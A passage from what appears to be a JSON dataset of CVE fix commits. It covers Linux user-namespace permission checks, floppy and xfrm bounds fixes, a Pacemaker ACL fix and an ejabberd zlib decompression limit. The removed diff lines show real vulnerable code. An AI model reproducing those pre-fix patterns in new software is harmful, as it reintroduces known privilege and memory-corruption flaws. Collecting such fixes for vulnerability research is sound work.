*buf,\n \n \tret = -EPERM;\n \t\/* Validate the user is allowed to use user id's mapped to. *\/\n-\tif (!new_idmap_permitted(ns, cap_setid, &new_map))\n+\tif (!new_idmap_permitted(file, ns, cap_setid, &new_map))\n \t\tgoto out;\n \n \t\/* Map the lower ids from the parent user namespace to the\n@@ -787,7 +788,8 @@ ssize_t proc_projid_map_write(struct file *file, const char __user *buf, size_t\n \t\t\t &ns->projid_map, &ns->parent->projid_map);\n }\n \n-static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,\n+static bool new_idmap_permitted(const struct file *file, \n+\t\t\t\tstruct user_namespace *ns, int cap_setid,\n \t\t\t\tstruct uid_gid_map *new_map)\n {\n \t\/* Allow mapping to your own filesystem ids *\/\n@@ -811,8 +813,10 @@ static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,\n \n \t\/* Allow the specified ids if we have the appropriate capability\n \t * (CAP_SETUID or CAP_SETGID) over the parent user namespace.\n+\t * And the opener of the id file also had the approprpiate capability.\n \t *\/\n-\tif (ns_capable(ns->parent, cap_setid))\n+\tif (ns_capable(ns->parent, cap_setid) &&\n+\t    file_ns_capable(file, ns->parent, cap_setid))\n \t\treturn true;\n \n \treturn false;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2015-1867","CWE_ID":"264","category":"security","commit_id":"84ac07c7d02b3badd708b1ef13a2159dede70715","commit_message":"From 84ac07c7d02b3badd708b1ef13a2159dede70715 Mon Sep 17 00:00:00 2001\nFrom: Andrew Beekhof <andrew@beekhof.net>\nDate: Tue, 7 Apr 2015 10:03:25 +1000\nSubject: [PATCH] Fix: acl: Do not delay evaluation of added nodes in some\n situations\n\nIt is not appropriate when the node has no children as it is not a\nplaceholder\n---\n lib\/common\/xml.c | 9 ++++++---\n 1 file changed, 6 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/lib\/common\/xml.c b\/lib\/common\/xml.c\nindex f3dd35b7a7..716f053f82 100644\n--- a\/lib\/common\/xml.c\n+++ b\/lib\/common\/xml.c\n@@ -1020,13 +1020,16 @@ __xml_acl_post_process(xmlNode * xml)\n \n     if(is_set(p->flags, xpf_created)) {\n         xmlAttr *xIter = NULL;\n+        char *path = xml_get_path(xml);\n \n-        \/* Always allow new scaffolding, ie. node with no attributes or only an 'id' *\/\n+        \/* Always allow new scaffolding, ie. node with no attributes or only an 'id'\n+         * Except in the ACLs section\n+         *\/\n \n         for (xIter = crm_first_attr(xml); xIter != NULL; xIter = xIter->next) {\n             const char *prop_name = (const char *)xIter->name;\n \n-            if (strcmp(prop_name, XML_ATTR_ID) == 0) {\n+            if (strcmp(prop_name, XML_ATTR_ID) == 0 && strstr(path, \"\/\"XML_CIB_TAG_ACLS\"\/\") == NULL) {\n                 \/* Delay the acl check *\/\n                 continue;\n \n@@ -1035,7 +1038,6 @@ __xml_acl_post_process(xmlNode * xml)\n                 break;\n \n             } else {\n-                char *path = xml_get_path(xml);\n                 crm_trace(\"Cannot add new node %s at %s\", crm_element_name(xml), path);\n \n                 if(xml != xmlDocGetRootElement(xml->doc)) {\n@@ -1046,6 +1048,7 @@ __xml_acl_post_process(xmlNode * xml)\n                 return;\n             }\n         }\n+        free(path);\n     }\n \n     while (cIter != NULL) {\n","owner":"ClusterLabs","repo":"pacemaker","source":"cve"},{"CVE_ID":"CVE-2014-1737","CWE_ID":"264","category":"security","commit_id":"ef87dbe7614341c2e7bfe8d32fcb7028cc97442c","commit_message":"From ef87dbe7614341c2e7bfe8d32fcb7028cc97442c Mon Sep 17 00:00:00 2001\nFrom: Matthew Daley <mattd@bugfuzz.com>\nDate: Mon, 28 Apr 2014 19:05:20 +1200\nSubject: floppy: ignore kernel-only members in FDRAWCMD ioctl input\n\nAlways clear out these floppy_raw_cmd struct members after copying the\nentire structure from userspace so that the in-kernel version is always\nvalid and never left in an interdeterminate state.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/block\/floppy.c | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/block\/floppy.c b\/drivers\/block\/floppy.c\nindex 8f5565bf34cd..12251a688871 100644\n--- a\/drivers\/block\/floppy.c\n+++ b\/drivers\/block\/floppy.c\n@@ -3121,10 +3121,11 @@ loop:\n \t\treturn -ENOMEM;\n \t*rcmd = ptr;\n \tret = copy_from_user(ptr, param, sizeof(*ptr));\n-\tif (ret)\n-\t\treturn -EFAULT;\n \tptr->next = NULL;\n \tptr->buffer_length = 0;\n+\tptr->kernel_data = NULL;\n+\tif (ret)\n+\t\treturn -EFAULT;\n \tparam += sizeof(struct floppy_raw_cmd);\n \tif (ptr->cmd_count > 33)\n \t\t\t\/* the command may now also take up the space\n@@ -3140,7 +3141,6 @@ loop:\n \tfor (i = 0; i < 16; i++)\n \t\tptr->reply[i] = 0;\n \tptr->resultcode = 0;\n-\tptr->kernel_data = NULL;\n \n \tif (ptr->flags & (FD_RAW_READ | FD_RAW_WRITE)) {\n \t\tif (ptr->length <= 0)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-1959","CWE_ID":"264","category":"security","commit_id":"e3211c120a85b792978bcb4be7b2886df18d27f0","commit_message":"From e3211c120a85b792978bcb4be7b2886df18d27f0 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Sun, 14 Apr 2013 16:28:19 -0700\nSubject: [PATCH] userns: Check uid_map's opener's fsuid, not the current fsuid\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\n---\n kernel\/user_namespace.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/user_namespace.c b\/kernel\/user_namespace.c\nindex e2d4ace4481bb..5c16f3aa757a0 100644\n--- a\/kernel\/user_namespace.c\n+++ b\/kernel\/user_namespace.c\n@@ -797,12 +797,12 @@ static bool new_idmap_permitted(const struct file *file,\n \t\tu32 id = new_map->extent[0].lower_first;\n \t\tif (cap_setid == CAP_SETUID) {\n \t\t\tkuid_t uid = make_kuid(ns->parent, id);\n-\t\t\tif (uid_eq(uid, current_fsuid()))\n+\t\t\tif (uid_eq(uid, file->f_cred->fsuid))\n \t\t\t\treturn true;\n \t\t}\n \t\telse if (cap_setid == CAP_SETGID) {\n \t\t\tkgid_t gid = make_kgid(ns->parent, id);\n-\t\t\tif (gid_eq(gid, current_fsgid()))\n+\t\t\tif (gid_eq(gid, file->f_cred->fsgid))\n \t\t\t\treturn true;\n \t\t}\n \t}\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-7184","CWE_ID":"264","category":"security","commit_id":"677e806da4d916052585301785d847c3b3e6186a","commit_message":"From 677e806da4d916052585301785d847c3b3e6186a Mon Sep 17 00:00:00 2001\nFrom: Andy Whitcroft <apw@canonical.com>\nDate: Wed, 22 Mar 2017 07:29:31 +0000\nSubject: [PATCH] xfrm_user: validate XFRM_MSG_NEWAE XFRMA_REPLAY_ESN_VAL\n replay_window\n\nWhen a new xfrm state is created during an XFRM_MSG_NEWSA call we\nvalidate the user supplied replay_esn to ensure that the size is valid\nand to ensure that the replay_window size is within the allocated\nbuffer.  However later it is possible to update this replay_esn via a\nXFRM_MSG_NEWAE call.  There we again validate the size of the supplied\nbuffer matches the existing state and if so inject the contents.  We do\nnot at this point check that the replay_window is within the allocated\nmemory.  This leads to out-of-bounds reads and writes triggered by\nnetlink packets.  This leads to memory corruption and the potential for\npriviledge escalation.\n\nWe already attempt to validate the incoming replay information in\nxfrm_new_ae() via xfrm_replay_verify_len().  This confirms that the user\nis not trying to change the size of the replay state buffer which\nincludes the replay_esn.  It however does not check the replay_window\nremains within that buffer.  Add validation of the contained\nreplay_window.\n\nCVE-2017-7184\nSigned-off-by: Andy Whitcroft <apw@canonical.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n net\/xfrm\/xfrm_user.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/net\/xfrm\/xfrm_user.c b\/net\/xfrm\/xfrm_user.c\nindex 9705c279494b2..cdf887fa61d57 100644\n--- a\/net\/xfrm\/xfrm_user.c\n+++ b\/net\/xfrm\/xfrm_user.c\n@@ -415,6 +415,9 @@ static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_es\n \tif (nla_len(rp) < ulen || xfrm_replay_state_esn_len(replay_esn) != ulen)\n \t\treturn -EINVAL;\n \n+\tif (up->replay_window > up->bmp_len * sizeof(__u32) * 8)\n+\t\treturn -EINVAL;\n+\n \treturn 0;\n }\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-2829","CWE_ID":"264","category":"security","commit_id":"654d07df5e352fa85e990dad079d5caec3df74ca","commit_message":"From 654d07df5e352fa85e990dad079d5caec3df74ca Mon Sep 17 00:00:00 2001\nFrom: Piotr Nosek <piotr.nosek@erlang-solutions.com>\nDate: Mon, 7 Apr 2014 12:05:43 +0200\nSubject: [PATCH 1\/3] Add zlib inflated data size limit\n\n---\n apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c | 151 +++++++++++++-----------\n apps\/ejabberd\/src\/ejabberd_c2s.erl      |  13 +-\n apps\/ejabberd\/src\/ejabberd_socket.erl   |   7 +-\n apps\/ejabberd\/src\/ejabberd_zlib.erl     |  13 +-\n apps\/ejabberd\/src\/mod_bosh_socket.erl   |   6 +-\n apps\/ejabberd\/src\/mod_websockets.erl    |   6 +-\n rel\/vars.config                         |   2 +-\n 7 files changed, 105 insertions(+), 93 deletions(-)\n\nFrom f6b99c36b795deea32a6d07d63049326f4c3e532 Mon Sep 17 00:00:00 2001\nFrom: Piotr Nosek <piotr.nosek@erlang-solutions.com>\nDate: Tue, 8 Apr 2014 11:33:20 +0200\nSubject: [PATCH 2\/3] Send policy-violation error when zlib size limit exceeded\n\n---\n apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c |  6 +++---\n apps\/ejabberd\/src\/ejabberd_c2s.erl      |  2 +-\n apps\/ejabberd\/src\/ejabberd_receiver.erl | 12 ++++++++++--\n apps\/ejabberd\/src\/ejabberd_zlib.erl     |  6 ++++--\n apps\/ejabberd\/src\/xml_stream.erl        |  2 +-\n rel\/files\/ejabberd.cfg                  |  2 ++\n rel\/reltool_vars\/node1_vars.config      |  7 +++++++\n 7 files changed, 28 insertions(+), 9 deletions(-)\n\nFrom 8ee494bb80fec035bff14f09e7c1e1e88da7c738 Mon Sep 17 00:00:00 2001\nFrom: Piotr Nosek <piotr.nosek@erlang-solutions.com>\nDate: Wed, 9 Apr 2014 10:33:36 +0200\nSubject: [PATCH 3\/3] Fix formatting and binary_to_existing_atom encoding Also\n replace keysearch with keyfind in c2s\n\n---\n apps\/ejabberd\/src\/ejabberd_c2s.erl      | 29 ++++++++++++-------------\n apps\/ejabberd\/src\/ejabberd_receiver.erl | 14 ++++++------\n apps\/ejabberd\/src\/ejabberd_socket.erl   |  2 +-\n apps\/ejabberd\/src\/ejabberd_zlib.erl     |  8 +++----\n 4 files changed, 26 insertions(+), 27 deletions(-)\n\n","diff_code":"diff --git a\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c b\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\nindex 68c99f973e..3469a5784f 100644\n--- a\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\n+++ b\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\n@@ -109,79 +109,86 @@ static void ejabberd_zlib_drv_stop(ErlDrvData handle)\n \n \n static ErlDrvSSizeT ejabberd_zlib_drv_control(ErlDrvData handle,\n-\t\t\t\t     unsigned int command,\n-\t\t\t\t     char *buf, ErlDrvSizeT len,\n-\t\t\t\t     char **rbuf, ErlDrvSizeT rlen)\n+        unsigned int command,\n+        char *buf, ErlDrvSizeT len,\n+        char **rbuf, ErlDrvSizeT rlen)\n {\n-   ejabberd_zlib_data *d = (ejabberd_zlib_data *)handle;\n-   int err;\n-   int size;\n-   ErlDrvBinary *b;\n-\n-   switch (command)\n-   {\n-      case DEFLATE:\n-\t size = BUF_SIZE + 1;\n-\t rlen = 1;\n-\t b = driver_alloc_binary(size);\n-\t b->orig_bytes[0] = 0;\n-\n-\t d->d_stream->next_in = (unsigned char *)buf;\n-\t d->d_stream->avail_in = len;\n-\t d->d_stream->avail_out = 0;\n-\t err = Z_OK;\n-\n-\t while (err == Z_OK && d->d_stream->avail_out == 0)\n-\t {\n-\t    d->d_stream->next_out = (unsigned char *)b->orig_bytes + rlen;\n-\t    d->d_stream->avail_out = BUF_SIZE;\n-\n-\t    err = deflate(d->d_stream, Z_SYNC_FLUSH);\n-\t    die_unless((err == Z_OK) || (err == Z_STREAM_END),\n-\t\t       \"Deflate error\");\n-\n-\t    rlen += (BUF_SIZE - d->d_stream->avail_out);\n-\t    size += (BUF_SIZE - d->d_stream->avail_out);\n-\t    b = driver_realloc_binary(b, size);\n-\t }\n-\t b = driver_realloc_binary(b, rlen);\n-\t *rbuf = (char *)b;\n-\t return rlen;\n-      case INFLATE:\n-\t size = BUF_SIZE + 1;\n-\t rlen = 1;\n-\t b = driver_alloc_binary(size);\n-\t b->orig_bytes[0] = 0;\n-\n-\t if (len > 0) {\n-\t    d->i_stream->next_in = (unsigned char *)buf;\n-\t    d->i_stream->avail_in = len;\n-\t    d->i_stream->avail_out = 0;\n-\t    err = Z_OK;\n-\n-\t    while (err == Z_OK && d->i_stream->avail_out == 0)\n-\t    {\n-\t       d->i_stream->next_out = (unsigned char *)b->orig_bytes + rlen;\n-\t       d->i_stream->avail_out = BUF_SIZE;\n-\n-\t       err = inflate(d->i_stream, Z_SYNC_FLUSH);\n-\t       die_unless((err == Z_OK) || (err == Z_STREAM_END),\n-\t\t\t  \"Inflate error\");\n-\n-\t       rlen += (BUF_SIZE - d->i_stream->avail_out);\n-\t       size += (BUF_SIZE - d->i_stream->avail_out);\n-\t       b = driver_realloc_binary(b, size);\n-\t    }\n-\t }\n-\t b = driver_realloc_binary(b, rlen);\n-\t *rbuf = (char *)b;\n-\t return rlen;\n-   }\n-\n-   b = driver_alloc_binary(1);\n-   b->orig_bytes[0] = 0;\n-   *rbuf = (char *)b;\n-   return 1;\n+    ejabberd_zlib_data *d = (ejabberd_zlib_data *)handle;\n+    int err;\n+    int size;\n+    int size_limit;\n+    ErlDrvBinary *b;\n+\n+    \/\/ operation is in command's 2 lower bits and size_limit is in bits higher than 1\n+    size_limit = command >> 2; \/\/ applies only to inflation\n+    command = command & 3;\n+    switch (command)\n+    {\n+        case DEFLATE:\n+            size = BUF_SIZE + 1;\n+            rlen = 1;\n+            b = driver_alloc_binary(size);\n+            b->orig_bytes[0] = 0;\n+\n+            d->d_stream->next_in = (unsigned char *)buf;\n+            d->d_stream->avail_in = len;\n+            d->d_stream->avail_out = 0;\n+            err = Z_OK;\n+\n+            while (err == Z_OK && d->d_stream->avail_out == 0)\n+            {\n+                d->d_stream->next_out = (unsigned char *)b->orig_bytes + rlen;\n+                d->d_stream->avail_out = BUF_SIZE;\n+\n+                err = deflate(d->d_stream, Z_SYNC_FLUSH);\n+                die_unless((err == Z_OK) || (err == Z_STREAM_END),\n+                        \"Deflate error\");\n+\n+                rlen += (BUF_SIZE - d->d_stream->avail_out);\n+                size += (BUF_SIZE - d->d_stream->avail_out);\n+                b = driver_realloc_binary(b, size);\n+            }\n+            b = driver_realloc_binary(b, rlen);\n+            *rbuf = (char *)b;\n+            return rlen;\n+        case INFLATE:\n+            size = BUF_SIZE + 1;\n+            rlen = 1;\n+            b = driver_alloc_binary(size);\n+            b->orig_bytes[0] = 0;\n+\n+            if (len > 0) {\n+                d->i_stream->next_in = (unsigned char *)buf;\n+                d->i_stream->avail_in = len;\n+                d->i_stream->avail_out = 0;\n+                err = Z_OK;\n+\n+                while (err == Z_OK && d->i_stream->avail_out == 0)\n+                {\n+                    d->i_stream->next_out = (unsigned char *)b->orig_bytes + rlen;\n+                    d->i_stream->avail_out = BUF_SIZE;\n+\n+                    err = inflate(d->i_stream, Z_SYNC_FLUSH);\n+                    die_unless((err == Z_OK) || (err == Z_STREAM_END),\n+                            \"Inflate error\");\n+\n+                    rlen += (BUF_SIZE - d->i_stream->avail_out);\n+                    die_unless((rlen < size_limit) || (size_limit == 0),\n+                            \"Inflate error - size limit reached\");\n+\n+                    size += (BUF_SIZE - d->i_stream->avail_out);\n+                    b = driver_realloc_binary(b, size);\n+                }\n+            }\n+            b = driver_realloc_binary(b, rlen);\n+            *rbuf = (char *)b;\n+            return rlen;\n+    }\n+\n+    b = driver_alloc_binary(1);\n+    b->orig_bytes[0] = 0;\n+    *rbuf = (char *)b;\n+    return 1;\n }\n \n \ndiff --git a\/apps\/ejabberd\/src\/ejabberd_c2s.erl b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\nindex 09ca26aca7..87c74a4428 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n@@ -80,7 +80,7 @@\n \t\tsasl_state,\n \t\taccess,\n \t\tshaper,\n-\t\tzlib = false,\n+\t\tzlib = {false, 0},\n \t\ttls = false,\n \t\ttls_required = false,\n \t\ttls_enabled = false,\n@@ -221,7 +221,10 @@ init([{SockMod, Socket}, Opts]) ->\n \t    {value, {_, XS}} -> XS;\n \t    _ -> false\n \tend,\n-    Zlib = lists:member(zlib, Opts),\n+    Zlib = case lists:keysearch(zlib, 1, Opts) of\n+               {value, {_, ZlibLimit}} -> {true, ZlibLimit};\n+               _ -> {false, 0}\n+           end,\n     StartTLS = lists:member(starttls, Opts),\n     StartTLSRequired = lists:member(starttls_required, Opts),\n     TLSEnabled = lists:member(tls, Opts),\n@@ -328,7 +331,7 @@ wait_for_stream({xmlstreamstart, _Name, Attrs}, StateData) ->\n \t\t    SockMod =\n \t\t\t (StateData#state.sockmod):get_sockmod(\n \t\t\t   StateData#state.socket),\n-\t\t    Zlib = StateData#state.zlib,\n+            {Zlib, _} = StateData#state.zlib,\n \t\t    CompressFeature =\n \t\t\tcase Zlib andalso\n \t\t\t      ((SockMod == gen_tcp) orelse\n@@ -613,7 +616,7 @@ wait_for_auth(closed, StateData) ->\n \n wait_for_feature_request({xmlstreamelement, El}, StateData) ->\n     #xmlel{name = Name, attrs = Attrs, children = Els} = El,\n-    Zlib = StateData#state.zlib,\n+    {Zlib, ZlibLimit} = StateData#state.zlib,\n     TLS = StateData#state.tls,\n     TLSEnabled = StateData#state.tls_enabled,\n     TLSRequired = StateData#state.tls_required,\n@@ -705,7 +708,7 @@ wait_for_feature_request({xmlstreamelement, El}, StateData) ->\n \t\t\t<<\"zlib\">> ->\n \t\t\t    Socket = StateData#state.socket,\n \t\t\t    ZlibSocket = (StateData#state.sockmod):compress(\n-\t\t\t\t\t   Socket,\n+\t\t\t\t\t   Socket, ZlibLimit,\n \t\t\t\t\t   xml:element_to_binary(\n \t\t\t\t\t      #xmlel{name = <<\"compressed\">>,\n \t\t\t\t\t             attrs = [{<<\"xmlns\">>, ?NS_COMPRESS}]})),\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_socket.erl b\/apps\/ejabberd\/src\/ejabberd_socket.erl\nindex d8fca8c94d..0f45038836 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_socket.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_socket.erl\n@@ -34,7 +34,7 @@\n \t starttls\/2,\n \t starttls\/3,\n \t compress\/1,\n-\t compress\/2,\n+\t compress\/3,\n \t reset_stream\/1,\n \t send\/2,\n \t send_xml\/2,\n@@ -152,10 +152,11 @@ compress(SocketData) ->\n     ejabberd_receiver:compress(SocketData#socket_state.receiver, ZlibSocket),\n     SocketData#socket_state{socket = ZlibSocket, sockmod = ejabberd_zlib}.\n \n-compress(SocketData, Data) ->\n+compress(SocketData, InflateSizeLimit, Data) ->\n     {ok, ZlibSocket} = ejabberd_zlib:enable_zlib(\n \t\t\t SocketData#socket_state.sockmod,\n-\t\t\t SocketData#socket_state.socket),\n+\t\t\t SocketData#socket_state.socket,\n+             InflateSizeLimit),\n     ejabberd_receiver:compress(SocketData#socket_state.receiver, ZlibSocket),\n     send(SocketData, Data),\n     SocketData#socket_state{socket = ZlibSocket, sockmod = ejabberd_zlib}.\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_zlib.erl b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\nindex 9d90a0dc51..54494c292e 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n@@ -30,7 +30,7 @@\n -behaviour(gen_server).\n \n -export([start\/0, start_link\/0,\n-\t enable_zlib\/2, disable_zlib\/1,\n+\t enable_zlib\/3, disable_zlib\/1,\n \t send\/2,\n \t recv\/2, recv\/3, recv_data\/2,\n \t setopts\/2,\n@@ -50,7 +50,7 @@\n -define(DEFLATE, 1).\n -define(INFLATE, 2).\n \n--record(zlibsock, {sockmod, socket, zlibport}).\n+-record(zlibsock, {sockmod, socket, zlibport, inflate_size_limit = 0}).\n \n start() ->\n     gen_server:start({local, ?MODULE}, ?MODULE, [], []).\n@@ -94,13 +94,14 @@ terminate(_Reason, Port) ->\n     ok.\n \n \n-enable_zlib(SockMod, Socket) ->\n+enable_zlib(SockMod, Socket, InflateSizeLimit) ->\n     case erl_ddll:load_driver(ejabberd:get_so_path(), ejabberd_zlib_drv) of\n \tok -> ok;\n \t{error, already_loaded} -> ok\n     end,\n     Port = open_port({spawn, ejabberd_zlib_drv}, [binary]),\n-    {ok, #zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port}}.\n+    {ok, #zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port,\n+                   inflate_size_limit = InflateSizeLimit}}.\n \n disable_zlib(#zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port}) ->\n     port_close(Port),\n@@ -138,8 +139,8 @@ recv_data2(ZlibSock, Packet) ->\n \t    Res\n     end.\n \n-recv_data1(#zlibsock{zlibport = Port} = _ZlibSock, Packet) ->\n-    case port_control(Port, ?INFLATE, Packet) of\n+recv_data1(#zlibsock{zlibport = Port, inflate_size_limit = SizeLimit} = _ZlibSock, Packet) ->\n+    case port_control(Port, SizeLimit bsl 2 + ?INFLATE, Packet) of\n \t<<0, In\/binary>> ->\n \t    {ok, In};\n \t<<1, Error\/binary>> ->\ndiff --git a\/apps\/ejabberd\/src\/mod_bosh_socket.erl b\/apps\/ejabberd\/src\/mod_bosh_socket.erl\nindex 0db80abaf7..34bb9939a4 100644\n--- a\/apps\/ejabberd\/src\/mod_bosh_socket.erl\n+++ b\/apps\/ejabberd\/src\/mod_bosh_socket.erl\n@@ -18,7 +18,7 @@\n \n %% ejabberd_socket compatibility\n -export([starttls\/2, starttls\/3,\n-         compress\/1, compress\/2,\n+         compress\/1, compress\/3,\n          reset_stream\/1,\n          send\/2,\n          send_xml\/2,\n@@ -823,9 +823,9 @@ starttls(_SocketData, _TLSOpts, _Data) ->\n \n %% Should be negotiated on HTTP level.\n compress(SocketData) ->\n-    compress(SocketData, <<>>).\n+    compress(SocketData, <<>>, 0).\n \n-compress(_SocketData, _Data) ->\n+compress(_SocketData, _Data, _InflateSizeLimit) ->\n     throw({error, negotiate_compression_on_http_level}).\n \n %% TODO: adjust for BOSH\ndiff --git a\/apps\/ejabberd\/src\/mod_websockets.erl b\/apps\/ejabberd\/src\/mod_websockets.erl\nindex 92bf1901b3..477018184c 100644\n--- a\/apps\/ejabberd\/src\/mod_websockets.erl\n+++ b\/apps\/ejabberd\/src\/mod_websockets.erl\n@@ -25,7 +25,7 @@\n \n %% ejabberd_socket compatibility\n -export([starttls\/2, starttls\/3,\n-         compress\/1, compress\/2,\n+         compress\/1, compress\/3,\n          reset_stream\/1,\n          send\/2,\n          send_xml\/2,\n@@ -229,9 +229,9 @@ starttls(_SocketData, _TLSOpts, _Data) ->\n     throw({error, tls_not_allowed_on_websockets}).\n \n compress(SocketData) ->\n-    compress(SocketData, <<>>).\n+    compress(SocketData, <<>>, 0).\n \n-compress(_SocketData, _Data) ->\n+compress(_SocketData, _Data, _InflateSizeLimit) ->\n     throw({error, compression_not_allowed_on_websockets}).\n \n reset_stream(#websocket{pid = Pid} = SocketData) ->\ndiff --git a\/rel\/vars.config b\/rel\/vars.config\nindex 1dc118695c..844676cf8e 100644\n--- a\/rel\/vars.config\n+++ b\/rel\/vars.config\n@@ -31,4 +31,4 @@\n {ext_auth_script, \"%%{extauth_program, \\\"\/path\/to\/authentication\/script\\\"}.\"}.\n {tls_config, \"%%{certfile, \\\"\/path\/to\/ssl.pem\\\"}, starttls,\"}.\n {wss_config, \"%%,{cert, \\\"priv\/server.crt\\\"}, {key, \\\"priv\/server.key\\\"}, {key_pass, \\\"\\\"}\"}. %% PEM format\n-{zlib, \"\"}.\n+{zlib, \"%%{zlib, 10000},\"}. %% Second element of a tuple is inflated data size limit; 0 for no limit\n\ndiff --git a\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c b\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\nindex 3469a5784f..8e3fe004e9 100644\n--- a\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\n+++ b\/apps\/ejabberd\/c_src\/ejabberd_zlib_drv.c\n@@ -142,7 +142,7 @@ static ErlDrvSSizeT ejabberd_zlib_drv_control(ErlDrvData handle,\n \n                 err = deflate(d->d_stream, Z_SYNC_FLUSH);\n                 die_unless((err == Z_OK) || (err == Z_STREAM_END),\n-                        \"Deflate error\");\n+                        \"deflate_error\");\n \n                 rlen += (BUF_SIZE - d->d_stream->avail_out);\n                 size += (BUF_SIZE - d->d_stream->avail_out);\n@@ -170,11 +170,11 @@ static ErlDrvSSizeT ejabberd_zlib_drv_control(ErlDrvData handle,\n \n                     err = inflate(d->i_stream, Z_SYNC_FLUSH);\n                     die_unless((err == Z_OK) || (err == Z_STREAM_END),\n-                            \"Inflate error\");\n+                            \"inflate_error\");\n \n                     rlen += (BUF_SIZE - d->i_stream->avail_out);\n                     die_unless((rlen < size_limit) || (size_limit == 0),\n-                            \"Inflate error - size limit reached\");\n+                            \"inflate_size_exceeded\");\n \n                     size += (BUF_SIZE - d->i_stream->avail_out);\n                     b = driver_realloc_binary(b, size);\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_c2s.erl b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\nindex 87c74a4428..e596df07e7 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n@@ -982,7 +982,7 @@ session_established({xmlstreamend, _Name}, StateData) ->\n     send_trailer(StateData),\n     {stop, normal, StateData};\n \n-session_established({xmlstreamerror, \"XML stanza is too big\" = E}, StateData) ->\n+session_established({xmlstreamerror, <<\"XML stanza is too big\">> = E}, StateData) ->\n     send_element(StateData, ?POLICY_VIOLATION_ERR(StateData#state.lang, E)),\n     send_trailer(StateData),\n     {stop, normal, StateData};\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_receiver.erl b\/apps\/ejabberd\/src\/ejabberd_receiver.erl\nindex 0c2d49c823..25c2b37cf5 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_receiver.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_receiver.erl\n@@ -56,6 +56,7 @@\n \t\ttimeout}).\n \n -define(HIBERNATE_TIMEOUT, 90000).\n+-define(GEN_FSM, p1_fsm).\n \n %%====================================================================\n %% API\n@@ -160,7 +161,10 @@ handle_call({compress, ZlibSocket}, _From,\n     case ejabberd_zlib:recv_data(ZlibSocket, \"\") of\n \t{ok, ZlibData} ->\n \t    {reply, ok, process_data(ZlibData, NewState), ?HIBERNATE_TIMEOUT};\n-\t{error, _Reason} ->\n+    {error, inflate_size_exceeded} ->\n+        ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n+        {reply, ok, NewState, ?HIBERNATE_TIMEOUT};\n+\t{error, inflate_error} ->\n \t    {stop, normal, ok, NewState}\n     end;\n handle_call(reset_stream, _From,\n@@ -205,6 +209,7 @@ handle_cast(_Msg, State) ->\n %%--------------------------------------------------------------------\n handle_info({Tag, _TCPSocket, Data},\n \t    #state{socket = Socket,\n+           c2s_pid = C2SPid,\n \t\t   sock_mod = SockMod} = State)\n   when (Tag == tcp) or (Tag == ssl) or (Tag == ejabberd_xml) ->\n     case SockMod of\n@@ -221,7 +226,10 @@ handle_info({Tag, _TCPSocket, Data},\n \t\t{ok, ZlibData} ->\n \t\t    {noreply, process_data(ZlibData, State),\n \t\t     ?HIBERNATE_TIMEOUT};\n-\t\t{error, _Reason} ->\n+        {error, inflate_size_exceeded} ->\n+            ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n+            {noreply, State, ?HIBERNATE_TIMEOUT};\n+\t\t{error, inflate_error} ->\n \t\t    {stop, normal, State}\n \t    end;\n \t_ ->\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_zlib.erl b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\nindex 54494c292e..c54518e493 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n@@ -144,7 +144,7 @@ recv_data1(#zlibsock{zlibport = Port, inflate_size_limit = 